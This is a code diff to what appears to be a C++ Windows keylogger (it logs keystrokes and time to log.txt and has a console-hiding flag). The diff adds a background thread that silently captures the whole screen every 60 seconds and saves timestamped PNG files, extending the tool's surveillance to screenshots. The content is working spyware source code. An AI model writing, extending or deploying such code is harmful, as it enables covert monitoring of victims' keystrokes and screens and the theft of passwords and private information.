@@ -3,6 +3,11 @@
 #include <fstream>
 #include <chrono>
 #include <ctime>
+#include <thread>
+#include <iomanip>
+#include <sstream>
+#define STB_IMAGE_WRITE_IMPLEMENTATION
+#include "stb_image_write.h"
 using namespace std;
 
 /*
@@ -11,12 +16,18 @@ using namespace std;
 */
 const bool HIDECONSOLE = false;
 
+/*
+	Set the screenshot interval in seconds
+*/
+const int SECONDS = 60;
+
 // Function Prototypes
 template <class T>
 void writeToFile(T input);
 bool specialKeys(int S_Key);
 void logTime();
 void checkForLowerCase(int &key);
+void takeScreenShot();
 
 int main()
 {
@@ -31,6 +42,9 @@ int main()
 
 	// To write the time at startup to the log.txt file
 	logTime();
+
+	// Thread to take screenshots parallely
+	thread t1(takeScreenShot);
 
 	while (true)
 	{
@@ -444,5 +458,73 @@ void checkForLowerCase(int &key)
 	else if (capslockPressed && shiftPressed) // When capslock and shift are pressed
 	{
 		key = int(tolower(char(key)));
+	}
+}
+
+/*
+	Method: takeScreenShot()
+	Parameters: None
+	Return Values: None
+	Purpose: Captures the entire screen and saves it as an image file (PNG format).
+			 The function captures the screen using Windows API, converts the bitmap data
+			 to raw pixel data, adjusts color channels as needed it, and writes the image
+			 to a file using the STB Image Writing library.
+*/
+void takeScreenShot()
+{
+	while (true)
+	{
+		// Generate a unique filename with a timestamp using <chrono> and localtime_s
+		auto now = chrono::system_clock::now();
+		auto currentTime = chrono::system_clock::to_time_t(now);
+
+		// Use localtime_s to safely populate the tm struct
+		struct tm local_tm;
+		localtime_s(&local_tm, &currentTime);
+		
+		// Format the filename with date and time
+		char buffer[100];
+		strftime(buffer, sizeof(buffer), "screenshot_%Y-%m-%d_%H;%M;%S", &local_tm);
+		string filename = "./screenshots/" + string(buffer) + ".png";
+
+		// Get screen dimensions
+		int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+		int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+		int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+		int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+		int width = x2 - x1;
+		int height = y2 - y1;
+
+		// Capture screen to HBITMAP
+		HDC hScreen = GetDC(NULL);
+		HDC hDC = CreateCompatibleDC(hScreen);
+		HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+		SelectObject(hDC, hBitmap);
+		BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);
+
+		// Convert HBITMAP to raw pixel data
+		BITMAP bmp;
+		GetObject(hBitmap, sizeof(BITMAP), &bmp);
+		int size = bmp.bmWidth * bmp.bmHeight * 4;
+		BYTE* pixels = new BYTE[size];
+		GetBitmapBits(hBitmap, size, pixels);
+
+		// Swap BGR to RGB
+		for (int i = 0; i < size; i += 4)
+		{
+			swap(pixels[i], pixels[i + 2]);  // Swap Blue (B) and Red (R) channels
+		}
+
+		// Save image with STB
+		stbi_write_png(filename.c_str(), bmp.bmWidth, bmp.bmHeight, 4, pixels, bmp.bmWidth * 4);
+
+		// Clean up
+		delete[] pixels;
+		DeleteObject(hBitmap);
+		DeleteDC(hDC);
+		ReleaseDC(NULL, hScreen);
+
+		// Waiting time for next screenshot
+		Sleep(SECONDS * 1000);
 	}
 }
